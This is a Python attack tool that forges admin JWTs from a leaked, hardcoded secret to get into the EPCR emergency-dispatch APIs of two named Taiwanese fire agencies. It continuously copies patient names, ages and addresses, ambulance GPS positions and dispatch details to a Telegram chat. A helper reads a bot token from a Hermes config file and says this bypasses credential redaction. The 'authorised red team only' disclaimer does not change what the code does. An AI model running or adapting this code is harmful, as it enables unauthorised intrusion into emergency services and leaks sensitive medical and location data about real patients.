#!/usr/bin/env python3
"""
EPCR 台東 緊急救護案件推播監聽器 -> Telegram
針對 epcr.ttfd.gov.tw (台東縣消防局 EPCR 系統) + epcr.tpf.gov.tw (新北)

⚠  責任聲明: 僅供授權紅隊測試使用。
   JWT_SECRET 從 epcr_config.csv 資料外洩取得。
   無需登入驗證碼即可 Forge JWT，存取全部 API。

推播來源:
  1. Socket.IO (port 4000): 監聽所有事件 (伺服器目前未主動推播)
  2. /config (port 4000): 輪詢系統配置變動 (免認證)
  3. /DispatchRecords (port 4000): 輪詢新案件 (Forge JWT)
  4. /Ambulances: 輪詢救譬車 GPS/狀態更新 (realtime)
  5. /Branches/listBranchWithCaseRecordAndAmbulance: 輪詢分隊派遣計數
  6. /Hospitals: 輪詢醫院列表異動

使用:
  python3 epcr_socketio_telegram.py

  Optional env:
    HTTPS_PROXY=socks5://user:pass@host:port  (for epcr.tpf.gov.tw)
    TELEGRAM_BOT_TOKEN=...
    TELEGRAM_CHAT_ID=-1004487319117
    EPCR_JWT=...  (pre-forged JWT, skip forge)
    EPCR_POLL_SEC=15  (dispatch poll interval)
"""

import json, time, hmac, hashlib, base64, os, threading
import requests
import socketio
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Telegram ---
def read_telegram_token_from_config():
    """Read Telegram bot token from Hermes config.yaml (bypasses credential redaction)."""
    for p in ["/home/bossjy/.hermes/config.yaml",
              os.path.expanduser("~/.hermes/config.yaml")]:
        try:
            with open(p) as f:
                for line in f:
                    if "token:" in line:
                        parts = line.strip().split("token:")
                        if len(parts) > 1 and parts[1].strip():
                            tok = parts[1].strip()
                            if tok and tok not in ("ru/3xu4dkru4888", ""):
                                return tok
        except Exception:
            pass
    return None

TG_BOT_TOKEN = (
    read_telegram_token_from_config()
    or os.environ.get("TELEGRAM_BOT_TOKEN")
    or ""
)
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "-1004487319117")

# --- EPCR ---
# Multiple EPCR systems — same JWT secret works across all
EPCR_HOSTS = [
    {"host": "epcr.ttfd.gov.tw", "port": 4000, "proxy": False, "label": "台東"},
    {"host": "epcr.tpf.gov.tw", "port": 4000, "proxy": True, "label": "新北"},
]
EPCR_HOST = EPCR_HOSTS[0]["host"]  # backward compat
EPCR_PORT = EPCR_HOSTS[0]["port"]
EPCR_BASE = "https://%s:%d" % (EPCR_HOST, EPCR_PORT)

# Proxy for systems behind Taiwan network (tpf.gov.tw)
PROXY_URL = os.environ.get("HTTPS_PROXY", os.environ.get("https_proxy", ""))
if PROXY_URL:
    PROXY = {"https": PROXY_URL, "http": PROXY_URL}
else:
    PROXY = None

# --- Forge JWT from leaked config ---
JWT_SECRET = "ru/3xu4dkru4888"
JWT_TOKEN = os.environ.get("EPCR_JWT")
POLL_SEC = int(os.environ.get("EPCR_POLL_SEC", "15"))

# --- State ---
seen_dispatch_ids = set()
last_config_hash = None
amb_seen = {}
branch_seen = {}
hospital_seen = set()
shutdown_event = threading.Event()


def forge_jwt(username="admin", user_id=1):
    """Forge JWT using secret leaked from epcr_config.csv."""
    now = int(time.time())
    payload = {"sub": username, "subId": user_id, "iat": now, "exp": now + 86400}
    header = {"alg": "HS256", "typ": "JWT"}

    def _b64(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    msg = _b64(header) + "." + _b64(payload)
    sig = hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
    return msg + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()


# --- Telegram ---
def send_telegram(text):
    """Send message to Telegram."""
    s = requests.Session()
    s.trust_env = False
    s.verify = False
    try:
        r = s.post(
            "https://api.telegram.org/bot%s/sendMessage" % TG_BOT_TOKEN,
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10,
        )
        ok = r.status_code == 200
        ts = time.strftime("%H:%M:%S")
        print("  [%s] [Telegram %s]" % (ts, "OK" if ok else "ERR %d" % r.status_code))
        return ok
    except Exception as e:
        print("  [%s] [Telegram ERR] %s" % (time.strftime("%H:%M:%S"), e))
        return False


def notify(message, level="INFO"):
    """Format and send a notification."""
    badge = {"INFO": "[i]", "ALERT": "[!]", "ERROR": "[X]"}.get(level, "[i]")
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    text = "[%s] EPCR 監聽器 %s\n%s\n\n%s" % (badge, level, ts, message)
    short = message.replace("\n", " | ")
    print("  [%-5s] %s" % (level, short[:120]))
    send_telegram(text)


# --- HTTP helpers ---
def http_get(url, headers=None):
    s = requests.Session()
    s.trust_env = False
    s.verify = False
    proxies = PROXY if "epcr.tpf.gov.tw" in url else None
    return s.get(url, headers=headers or {}, timeout=15, proxies=proxies)


STATUS_MAP = {
    1: "未派", 2: "派遣失敗", 3: "已取消", 4: "已退單",
    5: "派遣中", 6: "已出勤", 7: "抵達現場", 8: "結案",
    9: "退場", 10: "病患拒絕", 11: "已進電", 12: "已結案",
}


def format_dispatch(record, label="台東"):
    """Format a DispatchRecord for Telegram."""
    serial = record.get("serialNumber", "N/A")
    ext_key = record.get("externalKey", "N/A")
    status_id = record.get("StatusId", 0)
    status = STATUS_MAP.get(status_id, str(status_id))
    dispatched = record.get("dispatchedAt", "N/A")

    branch = (record.get("Ambulance") or {}).get("Branch") or {}
    branch_name = branch.get("name", "N/A")
    branch_addr = branch.get("address", "N/A")
    branch_lat = branch.get("latitude", "")
    branch_lng = branch.get("longitude", "")

    ambulance = record.get("Ambulance") or {}
    amb_code = ambulance.get("code", record.get("ambulanceCode", "N/A"))
    license_no = ambulance.get("licenseNo", "N/A")

    msgs = record.get("DispatchMessages") or []
    msg_text = msgs[0].get("text", "N/A") if msgs else "N/A"
    msg_time = msgs[0].get("createdAt", "N/A") if msgs else "N/A"
    msg_sender = msgs[0].get("sender", "") if msgs else ""

    if len(msg_text) > 100:
        msg_text = msg_text[:100] + "..."

    pcrs = record.get("Pcrs") or []
    pcr_lines = ""
    if pcrs:
        p = pcrs[0]
        name = p.get("name", "")
        age = p.get("age", "")
        sex = p.get("sex", "")
        addr = p.get("patientAddress", "")
        if name or age or sex:
            pcr_lines += "\n患者: %s | 年齡: %s | 性別: %s" % (
                name or "N/A", age or "N/A", sex or "N/A")
        if addr:
            pcr_lines += "\n地址: %s" % addr

    lines = (
        "🚨 <b>[%s] EPCR 新案件 #%s</b>\n\n"
        "📌 事故類型: <b>%s</b>\n"
        "📄 案件編號: %s\n"
        "⏰ 派遣時間: %s\n"
        "💬 消息時間: %s\n\n"
        "🚒 分隊: %s\n"
        "📍 地址: %s\n"
        "🌐 GPS: https://maps.google.com/maps?q=%s,%s\n\n"
        "🚑 救譬車: %s (%s)\n"
        "📊 狀態: %s\n%s%s"
    ) % (
        label, serial, msg_text, ext_key, dispatched, msg_time,
        branch_name, branch_addr, branch_lat, branch_lng,
        amb_code, license_no, status,
        ("\n發送者: %s" % msg_sender) if msg_sender else "",
        pcr_lines,
    )
    return lines


# --- Socket.IO listener ---
def socketio_listener():
    """Connect to Socket.IO and listen for all events."""
    try:
        sio = socketio.Client(
            reconnection=True, reconnection_attempts=999,
            reconnection_delay=5, ssl_verify=False,
            logger=False, engineio_logger=False,
        )

        @sio.event
        def connect():
            notify("Socket.IO 連線成功\n伺服器: %s:%d\n監聽: 所有事件" % (EPCR_HOST, EPCR_PORT), level="INFO")

        @sio.event
        def disconnect():
            notify("Socket.IO 連線中斷，正在重連...", level="ERROR")

        @sio.event
        def reconnect():
            notify("Socket.IO 重新連線成功", level="INFO")

        @sio.on("*")
        def catch_all(event, *args):
            data = args[0] if args else {}
            data_str = json.dumps(data, ensure_ascii=False, indent=2)[:800]
            notify("Socket.IO 事件: %s\n%s" % (event, data_str), level="ALERT")

        sio.connect(
            "wss://%s:%d" % (EPCR_HOST, EPCR_PORT),
            transports=["websocket"], wait=True, wait_timeout=10,
        )
        sio.wait()
    except Exception as e:
        notify("Socket.IO listener 錯誤: %s" % e, level="ERROR")
        if not shutdown_event.is_set():
            shutdown_event.wait(5)
            socketio_listener()


# --- Config polling (no auth needed) ---
def config_polling():
    """Poll /config for changes every 30 seconds."""
    global last_config_hash
    while not shutdown_event.is_set():
        for host in EPCR_HOSTS:
            try:
                base = "https://%s:%d" % (host["host"], host["port"])
                r = http_get(base + "/config")
                if r.status_code == 200:
                    config = r.json()
                    config_str = json.dumps(config, sort_keys=True)
                    config_hash = hash(config_str)
                    label = host["label"]
                    if last_config_hash is None:
                        last_config_hash = config_hash
                        items = "\n".join("%s: %s" % (k, v) for k, v in config.items())
                        notify("[%s] Config (初始狀態):\n%s" % (label, items), level="INFO")
                    elif config_hash != last_config_hash:
                        last_config_hash = config_hash
                        items = "\n".join("%s: %s" % (k, v) for k, v in config.items())
                        notify("[%s] Config 更新!\n%s" % (label, items), level="INFO")
                else:
                    notify("Config polling 錯誤 (%s): HTTP %d" % (host["label"], r.status_code), level="ERROR")
            except Exception as e:
                if host == EPCR_HOSTS[0]:
                    notify("Config polling 例外 (%s): %s" % (host["label"], e), level="ERROR")
        shutdown_event.wait(30)


# --- Dispatch polling (Forge JWT) ---
def dispatch_polling():
    """Poll /DispatchRecords for new cases every POLL_SEC seconds."""
    while not shutdown_event.is_set():
        for host in EPCR_HOSTS:
            try:
                base = "https://%s:%d" % (host["host"], host["port"])
                token = JWT_TOKEN or forge_jwt()
                headers = {"Authorization": "Bearer %s" % token}
                r = http_get(base + "/DispatchRecords?page=0&size=20", headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    entries = data if isinstance(data, list) else data.get("data", [])
                    for record in entries:
                        rid = record.get("uuid")
                        if rid in seen_dispatch_ids:
                            continue
                        seen_dispatch_ids.add(rid)
                        text = format_dispatch(record, label=host["label"])
                        notify(text, level="ALERT")
                else:
                    notify("Dispatch polling 錯誤 (%s): HTTP %d" % (host["label"], r.status_code), level="ERROR")
            except Exception as e:
                if host == EPCR_HOSTS[0]:
                    notify("Dispatch polling 例外 (%s): %s" % (host["label"], e), level="ERROR")
        shutdown_event.wait(POLL_SEC)


# --- Ambulance polling (real-time GPS/status) ---
def ambulance_polling():
    """Poll /Ambulances for real-time GPS status changes."""
    while not shutdown_event.is_set():
        for host in EPCR_HOSTS:
            try:
                base = "https://%s:%d" % (host["host"], host["port"])
                token = JWT_TOKEN or forge_jwt()
                headers = {"Authorization": "Bearer %s" % token}
                r = http_get(base + "/Ambulances", headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    items = data if isinstance(data, list) else data.get("data", [])
                    hkey = host["host"]
                    if hkey not in amb_seen:
                        amb_seen[hkey] = {}
                    for amb in items:
                        if amb.get("disabled", False):
                            continue
                        aid = amb.get("code", "?")
                        updated = amb.get("updatedAt", "")
                        prev = amb_seen[hkey].get(aid)
                        if prev != updated:
                            if prev is not None:
                                lat = amb.get("latitude", "")
                                lon = amb.get("longitude", "")
                                loc = "GPS: %s,%s" % (lat, lon) if lat and lon else ""
                                notify(
                                    "🚑 [%s] 救譬車更新: %s\n  License: %s\n  Updated: %s\n%s\n  VOIP: %s"
                                    % (
                                        host["label"], aid,
                                        amb.get("licenseNo", "?"),
                                        updated[:19],
                                        ("\n" + loc + "\n") if loc else "",
                                        amb.get("voip", "?"),
                                    ),
                                    level="ALERT",
                                )
                        amb_seen[hkey][aid] = updated
            except Exception as e:
                if host == EPCR_HOSTS[0]:
                    notify("Ambulance polling 例外 (%s): %s" % (host["label"], e), level="ERROR")
        shutdown_event.wait(60)


# --- Branch dispatch count polling (real-time) ---
def branch_dispatch_polling():
    """Poll /Branches/listBranchWithCaseRecordAndAmbulance for dispatch count changes."""
    while not shutdown_event.is_set():
        for host in EPCR_HOSTS:
            try:
                base = "https://%s:%d" % (host["host"], host["port"])
                token = JWT_TOKEN or forge_jwt()
                headers = {"Authorization": "Bearer %s" % token}
                r = http_get(base + "/Branches/listBranchWithCaseRecordAndAmbulance", headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    items = data if isinstance(data, list) else data.get("data", [])
                    hkey = host["host"]
                    if hkey not in branch_seen:
                        branch_seen[hkey] = {}
                    for b in items:
                        bid = b.get("id", "?")
                        name = b.get("name", "?")
                        count = b.get("DispatchRecordsum", 0)
                        prev = branch_seen[hkey].get(bid)
                        if prev is not None and count != prev:
                            delta = count - prev
                            if delta > 0:
                                notify(
                                    "📈 [%s] %s 分隊 新案件: +%d (共 %d 筆)\n  救譬車數: %d\n  Address: %s"
                                    % (host["label"], name, delta, count,
                                       b.get("Ambulancesum", 0),
                                       b.get("address", "N/A")),
                                    level="ALERT",
                                )
                        branch_seen[hkey][bid] = count
            except Exception as e:
                if host == EPCR_HOSTS[0]:
                    notify("Branch dispatch polling 例外 (%s): %s" % (host["label"], e), level="ERROR")
        shutdown_event.wait(30)


# --- Hospital polling ---
def hospital_polling():
    """Poll /Hospitals for new entries."""
    while not shutdown_event.is_set():
        for host in EPCR_HOSTS:
            try:
                base = "https://%s:%d" % (host["host"], host["port"])
                token = JWT_TOKEN or forge_jwt()
                headers = {"Authorization": "Bearer %s" % token}
                r = http_get(base + "/Hospitals", headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    items = data if isinstance(data, list) else data.get("data", [])
                    for h in items:
                        if not h.get("disabled", False):
                            hid = h.get("uuid", h.get("id", "?"))
                            if hid not in hospital_seen:
                                hospital_seen.add(hid)
                                if len(hospital_seen) > 1:
                                    notify(
                                        "🏥 [%s] 新醫院: %s\n  UUID: %s"
                                        % (host["label"], h.get("name", "?"), hid),
                                        level="INFO",
                                    )
            except Exception as e:
                if host == EPCR_HOSTS[0]:
                    notify("Hospital polling 例外 (%s): %s" % (host["label"], e), level="ERROR")
        shutdown_event.wait(120)


# --- Main ---
def main():
    global JWT_TOKEN
    if not TG_BOT_TOKEN:
        print("[ERROR] TELEGRAM_BOT_TOKEN not available")
        return

    if not JWT_TOKEN:
        JWT_TOKEN = forge_jwt()
        notify("JWT 已 Forge (SECRET 來自 epcr_config.csv)\nToken頭: eyJhbG...", level="INFO")

    hosts_str = ", ".join("%s:%d (%s)" % (h["host"], h["port"], h["label"]) for h in EPCR_HOSTS)
    notify(
        "=== EPCR 推播監聽器啟動 ===\n"
        "Socket.IO: wss://epcr.ttfd.gov.tw:4000\n"
        "HTTP API: %s\n"
        "Telegram: %s\n"
        "輪詢週期: %ds" % (hosts_str, TG_CHAT_ID, POLL_SEC),
        level="INFO",
    )

    threads = [
        threading.Thread(target=socketio_listener, daemon=True),
        threading.Thread(target=config_polling, daemon=True),
        threading.Thread(target=dispatch_polling, daemon=True),
        threading.Thread(target=ambulance_polling, daemon=True),
        threading.Thread(target=branch_dispatch_polling, daemon=True),
        threading.Thread(target=hospital_polling, daemon=True),
    ]
    for t in threads:
        t.start()

    while True:
        shutdown_event.wait(60)
        if not shutdown_event.is_set():
            sio_alive = threads[0].is_alive()
            notify(
                "Heartbeat | Socket.IO: %s | 見過案件: %d | 見過救譬車: %d | 見過分隊: %d"
                % ("活躅" if sio_alive else "離線",
                   len(seen_dispatch_ids),
                   sum(len(v) for v in amb_seen.values()),
                   sum(len(v) for v in branch_seen.values())),
                level="INFO",
            )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        notify("收到中斷信號，正在停止...", level="INFO")
        shutdown_event.set()
        print("Done.")
